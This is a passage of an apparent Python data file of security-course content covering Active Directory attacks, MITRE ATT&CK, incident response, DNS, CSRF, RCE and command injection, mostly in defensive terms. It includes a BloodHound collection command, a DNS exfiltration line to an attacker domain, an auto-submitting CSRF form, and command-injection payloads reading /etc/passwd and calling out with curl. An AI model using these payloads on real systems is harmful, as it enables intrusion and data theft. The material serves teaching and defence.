- **Golden/Silver tickets** — anomalies in ticket lifetimes, tickets for non-existent accounts, or a mismatch
  between the ticket's claims and the account.
- **AS-REP roasting** — Event ID **4768** with pre-auth not required.
Harden by: strong, rotated service-account passwords (or gMSAs), AES-only encryption, `krbtgt` rotation
(twice), removing unnecessary SPNs, and eliminating unconstrained delegation.
"""),
        ],
        "realworld": r"""Kerberoasting and Golden Tickets appear in a large share of real intrusions because they
turn an unprivileged foothold into domain dominance quickly and quietly. Many ransomware operators reach Domain
Admin within hours by chaining a phish, BloodHound path-finding, Kerberoasting a weak service account, and
DCSync. Rebuild that exact chain in a lab AD forest (GOAD is ideal) and then write the detections for each
step.""",
        "mistakes": [
            "Leaving service accounts with weak, non-expiring passwords and unnecessary SPNs.",
            "Permitting RC4 encryption, which makes Kerberoast hashes far cheaper to crack.",
            "Never rotating the krbtgt key, so a single past compromise grants indefinite Golden Ticket forgery.",
            "Configuring unconstrained delegation on servers that do not require it.",
            "Alerting only on failed logons and missing ticket-request (4769) anomalies entirely.",
        ],
        "bestpractices": [
            "Use group Managed Service Accounts (gMSAs) with long, auto-rotated passwords.",
            "Enforce AES encryption and disable RC4 for Kerberos where compatibility allows.",
            "Rotate the krbtgt password twice, periodically and after any suspected DC compromise.",
            "Replace unconstrained delegation with constrained/RBCD scoped to specific services.",
            "Monitor 4768/4769 for roasting and forged-ticket anomalies; hunt with BloodHound proactively.",
        ],
        "case": r"""**Kerberoasting in ransomware intrusions.** Incident reports from major DFIR vendors repeatedly
show operators Kerberoasting a SQL or backup service account with a weak password, cracking it offline in
minutes, and using it to move toward Domain Admin. The control that would have broken it — a 25+ character
managed password and AES-only encryption — costs nothing and is the single highest-value AD hardening step.""",
    },

    # =====================================================================
    "active-directory-attacks": {
        "theory": r"""Active Directory is the identity backbone of most enterprises, and attacking it is less
about single exploits than about **abusing legitimate features and misconfigurations to escalate and move**.
AD is a graph: users, computers, groups and their permissions (ACLs) form edges, and an attacker's job is to
find a path from a low-privileged foothold to a high-value target such as Domain Admin. The defender's job is
to see and cut those paths. This graph framing — popularised by BloodHound — is the single most important
mental model in the domain.

Because AD authentication runs on Kerberos and NTLM, most AD attacks are really credential and ticket attacks:
harvest a credential or ticket, use it somewhere it grants more power, repeat. The techniques (Kerberoasting,
ACL abuse, delegation, DCSync) are individually simple; the skill is chaining them along a path the graph
reveals, quietly enough to evade detection.""",
        "history": r"""Active Directory shipped with Windows 2000 and became ubiquitous. Offensive AD tradecraft
matured dramatically in the 2010s: Mimikatz (Benjamin Delpy, 2011) made credential and ticket theft
push-button; the "pass-the-hash" and "pass-the-ticket" families formalised lateral movement; and BloodHound
(2016) reframed AD compromise as graph pathfinding, making previously expert-only attack paths discoverable by
anyone. Zerologon (CVE-2020-1472) and the 2021 sAMAccountName/noPac (CVE-2021-42287/42278) bugs showed that
even the protocol layer yields domain takeover.""",
        "internal": r"""A typical domain-compromise chain:

1. **Foothold** — a phished user or a cracked password gives an unprivileged domain account.
2. **Enumerate** — collect the graph (BloodHound/SharpHound): sessions, group memberships, ACLs, delegation,
   SPNs.
3. **Escalate via a path** — e.g. a group the user can control has `GenericAll` over a privileged user;
   Kerberoast a weak service account; abuse an ACL to add yourself to a privileged group.
4. **Credential access** — dump credentials from memory (LSASS) or the domain (DCSync pulls hashes by
   impersonating a domain controller's replication).
5. **Domain dominance** — with the `krbtgt` hash (from DCSync) forge Golden Tickets for persistence.

Every edge is a *trust relationship* AD was designed to have; the attack is using it in an unintended
direction.""",
        "terminology": [
            ("BloodHound / SharpHound", "The collector and graph tool that reveals attack paths across AD."),
            ("ACL abuse", "Exploiting object permissions (GenericAll, WriteDACL, GenericWrite) to seize control of principals."),
            ("DCSync (T1003.006)", "Impersonating a DC's replication to pull password hashes, including krbtgt."),
            ("Pass-the-Hash / Pass-the-Ticket", "Authenticating with a stolen NTLM hash or Kerberos ticket instead of a password."),
            ("Tiered admin model", "Separating admin credentials by asset tier so a workstation compromise cannot reach DCs."),
            ("gMSA", "Group Managed Service Account with a long, auto-rotated password — mitigates Kerberoasting."),
        ],
        "extra": [
            ("The graph mindset with BloodHound", r"""AD compromise is shortest-path search on a permissions graph.

```bash
# Collect (from a domain-joined or credentialed context)
bloodhound-python -u user -p 'Password1' -d domain.local -c All -ns DC_IP
# or SharpHound.exe -c All
```

Load the data and ask BloodHound for "Shortest paths to Domain Admins". Each edge is an actionable technique:
`MemberOf`, `GenericAll`, `WriteDacl`, `ForceChangePassword`, `AddMember`, `AllowedToDelegate`. The defender
runs the *same* tool to find and cut those edges before an attacker walks them.
"""),
            ("A worked escalation and its detections", r"""A common path and the telemetry it leaves:

1. **Kerberoast** a service account (Event **4769**, RC4) → crack offline.
2. **ACL abuse**: that account has `GenericAll` on a helpdesk group → add yourself (Event **4728**).
3. The helpdesk group can `ForceChangePassword` on an admin (Event **4724**) → reset it.
4. **DCSync** with the admin (replication from a non-DC → Event **4662** / directory replication) → pull
   `krbtgt`.
5. **Golden Ticket** for persistence.

Defences: least privilege on ACLs, tiered admin, LSASS protection (Credential Guard), and alerting on 4769
roasting patterns, 4728/4724 in sensitive groups, and replication from non-DCs.
"""),
        ],
        "realworld": r"""Practically every major ransomware and espionage intrusion that reaches "enterprise-wide"
did so through AD: phish → escalate → DCSync → deploy. The NotPetya and numerous Conti/LockBit playbooks show
the same graph walk. Building a lab forest (GOAD) and walking foothold-to-DA yourself, then instrumenting it,
is the highest-leverage exercise in enterprise security.""",
        "mistakes": [
            "Flat admin model — the same admin logs into workstations and domain controllers, so any host compromise reaches DA.",
            "Over-permissive ACLs (GenericAll/WriteDACL granted broadly) creating hidden escalation edges.",
            "Weak service-account passwords and unnecessary SPNs feeding Kerberoasting.",
            "No LSASS protection, so a single admin session yields credentials for lateral movement.",
            "Detecting only malware, not the legitimate-feature-abuse (4769/4728/4662) that defines AD attacks.",
        ],
        "bestpractices": [
            "Adopt a tiered admin model and separate, non-overlapping admin credentials per tier.",
            "Run BloodHound defensively and remediate the shortest paths to privileged groups.",
            "Protect credentials in memory (Credential Guard) and restrict local admin (LAPS).",
            "Use gMSAs, AES-only Kerberos, and remove unneeded SPNs and delegation.",
            "Alert on Kerberoasting, sensitive-group changes, and replication from non-domain-controllers.",
        ],
        "case": r"""**Ransomware domain takeover (recurring pattern).** DFIR reporting consistently shows intrusions
reaching Domain Admin within hours via BloodHound-guided ACL abuse, Kerberoasting and DCSync, then deploying
ransomware through GPO or PsExec. The defensive takeaways are structural — tiering, least privilege, credential
protection — not a single patch. Reproduce the full path in a lab forest and measure how each control changes
the attacker's shortest path.""",
    },

    # =====================================================================
    "mitre-attack": {
        "theory": r"""MITRE ATT&CK is a curated, evidence-based knowledge base of adversary behaviour, organised
as a matrix of **tactics** (the attacker's goals — the "why") and **techniques** (how they achieve them — the
"how"). It gives defenders, red teams and threat intelligence a shared, precise vocabulary: instead of vague
labels like "advanced attack", you can say exactly "T1558.003 Kerberoasting" and everyone knows what is meant,
how it works, how to detect it, and which groups use it. That common language is ATT&CK's real value.

ATT&CK is descriptive, not prescriptive — it catalogues what adversaries actually do, drawn from public
incident reporting. It underpins detection engineering (map your detections to techniques and find gaps),
threat intelligence (describe a group by its techniques), red/purple teaming (plan and score coverage), and
risk communication (talk about behaviours rather than tools).""",
        "history": r"""ATT&CK began inside MITRE around 2013 as part of a research project (FMX) to improve
post-compromise detection, and was released publicly in 2015. It expanded from Windows enterprise to macOS,
Linux, cloud, mobile, ICS and containers, and spawned companion projects: the ATT&CK Navigator (coverage
heatmaps), D3FEND (countermeasures), Engage (adversary engagement), and CAR (analytics). It restructured in
2020 to introduce sub-techniques, and is now the de facto standard for describing adversary behaviour across
the industry.""",
        "internal": r"""The model is layered:

- **Tactics** (columns) — the adversary's objective at a stage: Reconnaissance, Initial Access, Execution,
  Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement,
  Collection, Command and Control, Exfiltration, Impact.
- **Techniques** (e.g. T1059 Command and Scripting Interpreter) — a general method for achieving a tactic.
- **Sub-techniques** (e.g. T1059.001 PowerShell) — a specific implementation.
- **Procedures** — the concrete, observed ways a specific group performs a technique.

Each technique page carries a description, detection guidance, data sources, mitigations, and the groups and
software known to use it. You *use* ATT&CK by mapping — a detection, a red-team action, or an intel report —
to technique IDs, which makes coverage measurable.""",
        "terminology": [
            ("Tactic", "The adversary's goal at a stage (e.g. Persistence); the columns of the matrix."),
            ("Technique / Sub-technique", "How a goal is achieved, general and specific (T1059 / T1059.001)."),
            ("Procedure", "A specific observed implementation of a technique by a group or tool."),
            ("Navigator", "A tool for building coverage/heatmap layers over the matrix."),
            ("Data source", "The telemetry (e.g. process creation, Kerberos ticket) needed to detect a technique."),
            ("D3FEND", "MITRE's complementary knowledge graph of defensive countermeasures."),
        ],
        "extra": [
            ("Using ATT&CK to drive detection", r"""ATT&CK turns "are we covered?" into a measurable question.

1. **Prioritise** techniques by what actually threatens you (use threat intel + ATT&CK's group pages).
2. **Map your detections** to technique IDs and paint a Navigator layer: green = solid detection, yellow =
   partial, red = blind.
3. **Validate** with atomic tests (Atomic Red Team) or purple-team exercises — execute the technique and
   confirm the detection fires.
4. **Close gaps** by adding the data source the technique needs (per its ATT&CK page) and a detection rule.

This detection-engineering loop, anchored to ATT&CK, is how mature SOCs measure and improve coverage rather
than guessing.
"""),
        ],
        "realworld": r"""Nearly every modern threat report, SIEM detection rule (Sigma includes ATT&CK tags), and
red-team plan references ATT&CK IDs. When CISA publishes an advisory on a threat group, it lists the group's
techniques by ID so defenders can immediately check their coverage. Adopting ATT&CK as your organisation's
lingua franca is one of the cheapest, highest-return moves in security operations.""",
        "mistakes": [
            "Treating ATT&CK as a checklist to '100% cover' rather than prioritising by real threat.",
            "Mapping tools to techniques loosely and claiming coverage you cannot actually detect.",
            "Ignoring data-source requirements — you cannot detect a technique whose telemetry you do not collect.",
            "Using technique IDs as jargon without validating detections against real execution.",
            "Forgetting ATT&CK is descriptive: absence from the matrix is not proof a behaviour is safe.",
        ],
        "bestpractices": [
            "Prioritise techniques using threat intelligence relevant to your sector, not the whole matrix.",
            "Maintain a Navigator layer of validated detection coverage and revisit it regularly.",
            "Validate coverage with Atomic Red Team / purple-team exercises, not self-assessment.",
            "Ensure the data sources each prioritised technique needs are actually being collected.",
            "Tag detections, incidents and intel with ATT&CK IDs to keep one shared vocabulary.",
        ],
        "case": r"""**APT reporting and coverage mapping.** After a major advisory (e.g. a state-linked group's
technique list), mature teams import the techniques into Navigator, overlay their detection coverage, and
immediately see their blind spots. Practise this end to end: pick a public group profile, build a coverage
layer, run atomic tests for the red techniques, and write the missing detections.""",
    },

    # =====================================================================
    "incident-response": {
        "theory": r"""Incident response is the disciplined process of preparing for, detecting, containing,
eradicating and recovering from security incidents — and, crucially, learning from them. Its purpose is to
limit damage and restore normal operation while preserving the evidence needed to understand what happened.
Good IR is mostly preparation: the quality of your response is decided by the runbooks, access, logging and
practice you put in place *before* the incident, not by heroics during it.

The defining tension in IR is **containment speed versus evidence preservation versus business continuity**.
Pull the plug too fast and you destroy volatile evidence and tip off the adversary; move too slowly and the
attacker spreads. Structured frameworks (NIST SP 800-61's Preparation → Detection & Analysis → Containment,
Eradication & Recovery → Post-Incident Activity, and the SANS PICERL variant) exist to make those trade-offs
deliberately rather than in a panic.""",
        "history": r"""Formal IR grew from the aftermath of the 1988 Morris Worm, which directly prompted the
creation of the first Computer Emergency Response Team (CERT/CC) at Carnegie Mellon. NIST codified the process
in SP 800-61 (now Rev. 2), and SANS popularised the PICERL mnemonic. The rise of targeted intrusions and
ransomware turned IR from an IT chore into a board-level capability, and intelligence-driven IR (mapping
activity to ATT&CK, tracking adversary campaigns) is now standard.""",
        "internal": r"""The lifecycle, in practice:

1. **Preparation** — runbooks, roles (incident commander, scribe, comms), tooling, logging coverage, and
   rehearsed tabletops. This phase decides the outcome.
2. **Detection & Analysis** — triage an alert, establish scope ("how many hosts, what data, which accounts"),
   and build a timeline. Order of volatility guides evidence collection: memory before disk before logs.
3. **Containment** — short-term (isolate a host) and long-term (block C2, reset credentials) while preserving
   evidence. Contain in a way that does not tip a sophisticated adversary prematurely.
4. **Eradication & Recovery** — remove persistence, patch the entry vector, rebuild from known-good, and
   restore service with heightened monitoring.
5. **Post-Incident Activity** — a blameless review that turns the incident into detections, hardening and
   updated runbooks.

The through-line is evidence: every action is logged so the timeline — and any later legal process — holds
up.""",
        "terminology": [
            ("Incident commander", "The single person coordinating the response and making containment decisions."),
            ("Order of volatility", "The sequence to collect evidence by how quickly it disappears (RAM → disk → logs)."),
            ("Chain of custody", "Documented handling of evidence that preserves its integrity and admissibility."),
            ("Containment", "Limiting an incident's spread; short-term (isolate) vs long-term (remediate the vector)."),
            ("Eradication", "Removing the attacker's presence, tools and persistence entirely."),
            ("Dwell time", "How long an attacker was present before detection — a key metric to minimise."),
            ("Blameless post-mortem", "A review focused on systemic causes and improvements, not individual fault."),
        ],
        "extra": [
            ("Running the first hour", r"""The opening moves of a real incident, in order:

1. **Declare and staff.** Name an incident commander and a scribe; open a dedicated, out-of-band comms channel
   (assume email/chat may be monitored by the adversary).
2. **Triage and scope.** What fired the alert? Which hosts, accounts and data are implicated? Do not fixate on
   patient zero before understanding spread.
3. **Preserve volatile evidence** before containing: capture memory and volatile artefacts from key hosts.
4. **Contain deliberately.** Isolate affected hosts (network quarantine, not power-off, to keep RAM), disable
   compromised accounts, and block known C2.
5. **Communicate.** Keep leadership and (as required) legal/regulatory stakeholders informed on a defined
   cadence.

Decisions made here are hard to reverse — which is exactly why they should be rehearsed in tabletops
beforehand.
"""),
        ],
        "realworld": r"""Contrast a rehearsed response with an improvised one: organisations that had practised
tabletops, out-of-band comms and pre-authorised containment during major ransomware events contained damage in
hours; those without spent days deciding who could authorise pulling a domain controller. The differentiator is
almost always preparation, not tooling. Build and run a scripted tabletop in the lab to feel this directly.""",
        "mistakes": [
            "Powering off a host and destroying volatile memory evidence before capturing it.",
            "No incident commander, so decisions stall and actions conflict.",
            "Communicating over channels the adversary may control, tipping them off.",
            "Eradicating patient zero while missing persistence and secondary footholds, causing reinfection.",
            "Skipping the blameless post-mortem, so the same gap is exploited again.",
        ],
        "bestpractices": [
            "Invest in preparation: runbooks, roles, logging coverage, and regular tabletops.",
            "Follow order of volatility; preserve evidence before you contain.",
            "Use out-of-band communications during an active intrusion.",
            "Contain to stop spread without prematurely alerting a sophisticated adversary.",
            "Close every incident with a blameless review that yields new detections and hardening.",
        ],
        "case": r"""**Maersk / NotPetya (2017).** A destructive wormable attack encrypted ~49,000 laptops and
thousands of servers within hours, halting global operations. Recovery famously depended on a single surviving
domain controller (offline by chance during the outage). The IR lessons: segmentation limits blast radius,
tested offline backups are existential, and rehearsed crisis command turns catastrophe into mere disaster.""",
    },

    # =====================================================================
    "dns": {
        "theory": r"""DNS is the internet's distributed naming system: it translates human-friendly names like
`example.com` into the IP addresses machines route to, plus a wealth of other records (mail servers, text
records, service locations). It is a hierarchical, cached, globally-distributed database queried billions of
times a second, and almost every other protocol depends on it working correctly. That ubiquity and trust make
DNS both a rich attack surface and a powerful source of security telemetry.

For security, DNS matters three ways. As a **target**, it can be poisoned (feeding victims false answers) or
hijacked (redirecting a domain). As a **channel**, its ever-allowed outbound traffic is abused for C2 and data
exfiltration (DNS tunnelling). As a **sensor**, DNS logs reveal malware beaconing, newly-registered domains and
exfiltration patterns better than almost any other single data source. Understanding resolution is the
prerequisite for all three.""",
        "history": r"""Before DNS, name-to-address mapping lived in a single `HOSTS.TXT` file distributed by SRI —
unscalable as the network grew. Paul Mockapetris designed DNS in 1983 (RFCs 882/883, later 1034/1035). Security
was not an original goal: Dan Kaminsky's 2008 cache-poisoning discovery showed how easily resolvers could be
fooled, driving source-port randomisation and accelerating DNSSEC (RFCs 4033–4035). Privacy came later with
DNS-over-TLS (RFC 7858, 2016) and DNS-over-HTTPS (RFC 8484, 2018), which encrypt queries — a mixed blessing
that also blinds some defensive monitoring.""",
        "internal": r"""Resolving `www.example.com` from a stub resolver typically walks the hierarchy via a
recursive resolver:

1. Ask a **root** server → it refers you to the `.com` **TLD** servers.
2. Ask the `.com` servers → they refer you to `example.com`'s **authoritative** servers.
3. Ask the authoritative servers → they return the `A`/`AAAA` record.

Answers are **cached** at each level for their TTL, which is what makes DNS scale — and what makes cache
poisoning valuable, since one bad cached answer serves many victims. Key record types: `A`/`AAAA` (addresses),
`CNAME` (alias), `MX` (mail), `NS` (delegation), `TXT` (SPF/DKIM/verification), `SOA` (zone authority),
`PTR` (reverse). Each is a place data crosses a trust boundary — and each is something an attacker can forge if
DNSSEC is absent.""",
        "terminology": [
            ("Recursive resolver", "The server that does the full lookup on a client's behalf and caches results."),
            ("Authoritative server", "The server holding the real records for a zone."),
            ("TTL", "Time-to-live — how long an answer may be cached; central to poisoning and failover."),
            ("Cache poisoning", "Injecting a forged answer into a resolver's cache so victims are misdirected."),
            ("DNSSEC", "Cryptographic signatures over records that let resolvers verify authenticity."),
            ("DNS tunnelling", "Encoding non-DNS data in DNS queries/responses for covert C2 or exfiltration."),
            ("DoH / DoT", "DNS over HTTPS / TLS — encrypted transport that improves privacy but can blind monitoring."),
        ],
        "extra": [
            ("DNS as attack channel and as sensor", r"""Because outbound DNS is almost always permitted, attackers
abuse it, and defenders watch it.

**Exfiltration / C2 (offensive, lab only):** data is encoded into subdomain labels of a domain the attacker
controls; the authoritative server logs (and reconstructs) it:
```
<base32-chunk-of-stolen-data>.exfil.attacker.example  ->  attacker's authoritative NS
```
Signatures a defender hunts: abnormally long or high-entropy subdomains, high query volume to one domain, and
lots of unique subdomains (many TXT/NULL queries).

**Detection (defensive):** DNS logs are gold — beaconing to newly-registered or algorithmically-generated
domains (DGA), spikes of NXDOMAIN, and long/entropic labels. Zeek and Suricata produce per-query logs ideal
for this; a Sigma rule on subdomain length/entropy catches much tunnelling.
"""),
        ],
        "realworld": r"""The 2008 Kaminsky cache-poisoning class-break forced a coordinated global patch (source-
port randomisation) and is the canonical DNS-integrity case. On the offensive side, DNS tunnelling has been
used by real malware families (e.g. certain APT toolkits and point-of-sale malware) to exfiltrate card data
past firewalls that blocked everything except DNS. Reproduce a benign DNS-tunnel and then detect it in the lab
to internalise both sides.""",
        "mistakes": [
            "Assuming DNS is 'just infrastructure' and not logging or monitoring it.",
            "Allowing unrestricted outbound DNS to arbitrary resolvers, enabling tunnelling and exfiltration.",
            "Deploying DoH/DoT without accounting for the loss of DNS visibility it can cause.",
            "Neglecting DNSSEC where integrity matters, leaving cache poisoning and hijacking easier.",
            "Ignoring zone-transfer (AXFR) exposure that leaks an organisation's entire internal namespace.",
        ],
        "bestpractices": [
            "Log and monitor DNS centrally; it is one of the highest-value telemetry sources you have.",
            "Force clients through controlled resolvers and restrict/inspect outbound DNS to catch tunnelling.",
            "Deploy DNSSEC for zones where answer integrity matters; validate on resolvers.",
            "Restrict zone transfers to authorised secondaries only.",
            "Hunt for DGA/tunnelling signals: entropy, label length, NXDOMAIN spikes and newly-registered domains.",
        ],
        "case": r"""**The 2008 Kaminsky vulnerability.** By combining predictable transaction IDs with the ability
to trigger many queries, an attacker could forge authoritative answers and poison a resolver's cache for an
entire domain. The coordinated response — source-port randomisation across every major DNS implementation —
was one of the largest synchronised patch efforts in internet history and is why DNSSEC deployment accelerated.""",
    },

    # =====================================================================
    "csrf": {
        "theory": r"""Cross-Site Request Forgery abuses the browser's habit of automatically attaching a user's
credentials (cookies, HTTP auth) to *every* request to a site, regardless of who initiated it. If an
application decides "this request carries a valid session cookie, therefore the user intended it", an attacker
can forge a state-changing request from a page the victim visits elsewhere, and the browser will send it fully
authenticated. The user is the confused deputy: their browser acts on the attacker's behalf.

CSRF only affects actions that rely on ambient credentials and change state (transfer money, change email,
add an admin). The defence is to require proof that the request came from your own application — a value the
attacker cannot know or send cross-site — via anti-CSRF tokens, and to lean on the browser's `SameSite` cookie
attribute, which stops cookies riding along on cross-site requests in the first place.""",
        "history": r"""CSRF (also "session riding" or "one-click attack") was documented in the early 2000s and
was a Top 10 mainstay for years. It has *fallen* in prevalence — not because developers universally add tokens,
but because browsers changed the default: since ~2020 Chrome and others treat cookies as `SameSite=Lax` unless
told otherwise, which neutralises the classic cross-site POST for cookie-based sessions. OWASP dropped CSRF
from its own Top 10 (2017) reflecting this, though it remains exploitable wherever `SameSite=None` is set,
where non-cookie ambient auth is used, or where token checks are flawed.""",
        "internal": r"""A vulnerable flow: the bank's "change email" endpoint accepts a POST with the new address
and trusts the session cookie. The attacker hosts a page with an auto-submitting form:

```html
<form action="https://bank.example/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

When the logged-in victim opens it, the browser attaches their bank cookie and the change succeeds. The
attacker never sees the response (the same-origin policy hides it) — they do not need to; the *side effect*
already happened. The fix breaks the one assumption the attack relies on: that a valid cookie implies user
intent. A per-session, unpredictable token echoed in the form and verified server-side supplies the missing
proof of intent, because the attacker's cross-site page cannot read it.""",
        "terminology": [
            ("Ambient authority", "Credentials the browser attaches automatically (cookies, HTTP auth) regardless of request origin."),
            ("Anti-CSRF token (synchronizer token)", "An unpredictable per-session value the server issues and verifies to prove same-origin intent."),
            ("SameSite cookie", "A cookie attribute (Lax/Strict/None) controlling whether cookies ride on cross-site requests."),
            ("Double-submit cookie", "A stateless CSRF defence comparing a token in a cookie against one in the request body."),
            ("State-changing request", "A request with a side effect (write/delete) — the only kind CSRF targets."),
            ("Login CSRF", "Forcing a victim to log in as the attacker, poisoning their session."),
        ],
        "extra": [
            ("Defending correctly", r"""Layer these; do not rely on any single one:

1. **SameSite cookies** — set session cookies `SameSite=Lax` (or `Strict` for sensitive apps). This alone stops
   most cross-site cookie-borne CSRF, but is a browser behaviour, not a guarantee for every client.
2. **Anti-CSRF tokens** — issue a per-session (or per-request) token, embed it in forms/headers, and verify it
   server-side on every state-changing request. Frameworks (Django, Rails, Spring) provide this — use it.
3. **Custom-header requirement for APIs** — require a header like `X-Requested-With` that cross-site forms
   cannot set, backed by CORS.
4. **Re-authentication / step-up** for the most sensitive actions (change password, transfer funds).

Non-defences: checking the `Referer` alone (strippable/absent), using GET for writes (worst case), or relying
on obscurity.
"""),
        ],
        "realworld": r"""Classic CSRF incidents changed router DNS settings, added admin users to web apps, and
altered account emails as a precursor to takeover. The pattern is always the same: a state-changing endpoint
that trusts the session cookie alone. Reproduce it against DVWA/bWAPP, then close it with a token and
`SameSite`, and confirm the forged request is now rejected.""",
        "mistakes": [
            "Assuming SameSite defaults protect you everywhere — some clients and SameSite=None cookies still ride cross-site.",
            "Validating the CSRF token only on some endpoints, leaving others exposed.",
            "Using GET for state-changing actions, making CSRF trivial and cache-leaky.",
            "Relying on the Referer/Origin header alone, which can be absent or spoofed in some contexts.",
            "Exempting JSON APIs from CSRF thinking they are immune — they are not if they accept form-encoded bodies or use cookies.",
        ],
        "bestpractices": [
            "Set session cookies SameSite=Lax or Strict, plus Secure and HttpOnly.",
            "Use your framework's synchronizer-token protection on every state-changing request.",
            "Require a custom header (enforced by CORS) for API state changes.",
            "Step up authentication for the highest-impact actions.",
            "Test that forged cross-site POSTs are rejected as part of your regression suite.",
        ],
        "case": r"""**Home-router CSRF (widespread, 2010s).** Malicious pages issued forged requests to routers'
web interfaces (often still on default credentials) to change DNS servers, silently redirecting victims'
traffic. It shows CSRF's reach beyond web apps into any cookie/credential-trusting HTTP interface, and why
`SameSite` defaults were a meaningful ecosystem-wide fix.""",
    },

    # =====================================================================
    "rce": {
        "theory": r"""Remote Code Execution is the most severe outcome in application security: an attacker runs
code of their choosing on your server. It is rarely a vulnerability class of its own so much as the
*destination* of many others — command injection, insecure deserialization, template injection, file upload,
memory corruption, and dependency flaws all chain toward it. Because RCE grants a foothold from which the
attacker can pivot, persist and exfiltrate, it is the outcome every other control exists to prevent.

Reasoning about RCE means reasoning about **where attacker-controlled data can influence what the server
executes** — a shell command, a deserialized object graph, a template, a loaded class, an uploaded script, or
native memory. The mitigations differ by path, but the strategic defences are constant: never pass untrusted
data to an evaluator, run services with least privilege, and isolate them so that code execution buys the
attacker as little as possible.""",
        "history": r"""RCE has driven the internet's worst incidents for decades: Code Red (2001, IIS buffer
overflow), Shellshock (2014, Bash environment-variable parsing), Struts2 (CVE-2017-5638, behind the Equifax
breach), and Log4Shell (CVE-2021-44228, a JNDI lookup in logged strings that became unauthenticated RCE across
a huge fraction of Java software overnight). The through-line: a feature that evaluated attacker-influenced
input in an unexpected place. Each prompted emergency global patching and reshaped how much scrutiny "just
logging a string" or "just parsing input" receives.""",
        "internal": r"""RCE is reached along distinct paths, each with its own mechanics:

- **Command injection** — user input reaches a shell (`os.system`, backticks); metacharacters run extra
  commands. Fix: never call a shell; pass argument arrays to `execve`-style APIs.
- **Insecure deserialization** — untrusted bytes are turned into objects, triggering gadget chains. Fix:
  don't deserialize untrusted data into rich objects; use schema-validated formats.
- **Template injection (SSTI)** — input is evaluated by a template engine, escaping the sandbox to reach
  Python/Java internals. Fix: never build templates from user input.
- **Unsafe eval / dynamic loading** — input reaches `eval`, `exec`, or a class loader (Log4Shell's JNDI).
- **File upload / LFI chains** — an attacker writes or includes executable content.
- **Memory corruption** — an overflow yields native code execution.

In every case, the boundary crossed is *code versus data*, and the fix is to keep untrusted input strictly as
data.""",
        "terminology": [
            ("Foothold", "The initial code-execution access an attacker gains on a target."),
            ("Gadget chain", "A sequence of existing code invoked via deserialization to reach execution."),
            ("Shellcode / payload", "The code an attacker runs once execution is achieved."),
            ("Sandbox escape", "Breaking out of a restricted execution context (template/interpreter/container) to the host."),
            ("Least privilege", "Running the service with the minimum rights, so RCE yields little."),
            ("Egress control", "Restricting outbound connections so a foothold cannot easily reach C2."),
        ],
        "extra": [
            ("Containment: assume RCE will happen", r"""Prevention reduces likelihood; containment reduces impact.
Design so that a single RCE does not equal total compromise:

- **Least privilege** — run app processes as a non-root user with no unnecessary capabilities; drop Linux
  capabilities and use seccomp.
- **Isolation** — containerise with a read-only root filesystem, no host mounts, and a minimal image; treat a
  container as a blast-radius boundary, not a security boundary you can ignore.
- **Egress filtering** — block outbound connections by default so a foothold cannot fetch a second stage or
  reach C2.
- **Secrets hygiene** — keep credentials out of the app environment where a foothold would read them; scope
  cloud roles tightly.
- **Detection** — alert on unexpected child processes of web servers (`www-data` spawning `sh`/`curl`), new
  outbound connections, and file writes to web roots.
"""),
        ],
        "realworld": r"""Log4Shell (2021) is the defining modern RCE: because Log4j performed JNDI lookups on
strings it logged, an attacker who got a crafted string logged (a username, a User-Agent) could make the server
fetch and execute a remote class. It affected an enormous share of Java applications and triggered one of the
largest coordinated patching efforts ever. Trace how "log this string" became "execute my code" and note that
egress filtering alone would have broken the exploit's second stage.""",
        "mistakes": [
            "Passing untrusted input to a shell instead of using argument arrays and avoiding a shell entirely.",
            "Deserializing untrusted data into rich objects (Java/PHP/Python native serialization).",
            "Running web services as root or with broad capabilities, so RCE means host compromise.",
            "No egress filtering, letting a foothold pull a second stage and reach C2 freely.",
            "Treating a container as a hard boundary while mounting the Docker socket or host paths into it.",
        ],
        "bestpractices": [
            "Never pass untrusted data to an evaluator (shell, deserializer, template, class loader, eval).",
            "Run services as non-root, least-privilege, with seccomp/AppArmor and a read-only rootfs.",
            "Enforce default-deny egress so footholds cannot fetch stages or exfiltrate.",
            "Keep dependencies patched and inventoried (SBOM) — many RCEs are third-party.",
            "Alert on web-server processes spawning shells or making unexpected outbound connections.",
        ],
        "case": r"""**Equifax (2017).** An unpatched Apache Struts2 RCE (CVE-2017-5638) — a flaw in parsing the
`Content-Type` header via OGNL — gave attackers a foothold that led to the theft of ~147 million people's
data. Root causes to extract: a known, patchable RCE left exposed for months, flat internal access from the
foothold, and unencrypted credentials that widened the breach. Defence in depth would have broken the chain at
several points.""",
    },

    # =====================================================================
    "command-injection": {
        "theory": r"""OS command injection occurs when an application builds a system-shell command out of
untrusted input. The shell is a powerful interpreter with metacharacters (`;`, `|`, `&`, `` ` ``, `$()`) that
separate and chain commands; when user input flows into a command string unescaped, those metacharacters let an
attacker append or substitute commands that run with the application's privileges. It is the same code/data
confusion as SQL injection, but the interpreter is the operating-system shell, and the payoff is usually direct
RCE.

The definitive fix is architectural, not cosmetic: do not invoke a shell at all. Call the target program
directly through an API that takes an *array of arguments* (`execve`, `subprocess.run([...], shell=False)`),
so the OS treats each argument as opaque data and there is no shell to interpret metacharacters. Escaping is a
fragile fallback; avoiding the shell removes the vulnerability class.""",
        "history": r"""Command injection is as old as CGI scripts that shelled out to system utilities, and it
remains common wherever applications wrap command-line tools (image processors, PDF generators, network
utilities, backup scripts). Shellshock (2014) was a spectacular variant: Bash executed code trailing function
definitions in environment variables, so any pathway that set an environment variable from user input (CGI
headers, DHCP) became RCE. It is CWE-78, a permanent fixture of the CWE Top 25.""",
        "internal": r"""A vulnerable ping feature:

```python
os.system("ping -c 1 " + user_host)      # user_host = "8.8.8.8; cat /etc/passwd"
```

The shell runs `ping`, sees `;`, and runs `cat /etc/passwd` next. Variants:
- **In-band** — output is returned, so `; id` shows immediately.
- **Blind** — no output; confirm with time (`; sleep 5`) or an out-of-band callback (`; curl http://you/$(whoami)`).
- **Argument injection** — even without shell metacharacters, injecting extra *flags* (e.g. a leading `-`)
  changes the invoked program's behaviour dangerously.

The safe version passes an argument list and no shell:

```python
subprocess.run(["ping", "-c", "1", user_host], shell=False)   # user_host can never become a new command
```""",
        "terminology": [
            ("Shell metacharacter", "A character the shell treats specially (`; | & $ ( ) ` < >`) to chain or substitute commands."),
            ("Argument injection", "Injecting extra flags into a command even when metacharacters are blocked."),
            ("Blind command injection", "No command output returned; inferred via timing or out-of-band callbacks."),
